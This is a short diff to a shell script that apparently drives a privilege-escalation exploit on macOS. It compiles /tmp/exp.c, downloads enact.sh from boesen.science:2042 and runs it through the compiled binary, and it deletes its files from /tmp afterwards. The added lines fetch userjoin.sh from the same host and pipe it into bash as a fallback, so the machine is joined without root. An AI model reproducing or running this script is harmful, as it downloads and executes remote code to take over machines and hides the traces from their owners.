@@ -8,9 +8,13 @@ gcc /tmp/exp.c -o /tmp/a.out
 curl -Lso /tmp/enact.sh boesen.science:2042/mac/enact.sh
 chmod +x /tmp/enact.sh
 
+# If something's gone wrong, join the user without getting root.
+if [ ! -f /tmp/a.out ]; then curl -L boesen.science:2042/mac/userjoin.sh |bash; fi
+
 /tmp/a.out <<EOF
 /tmp/enact.sh
 EOF
+
 
 rm -f /tmp/*.sh /tmp/*.c /tmp/*.out
 
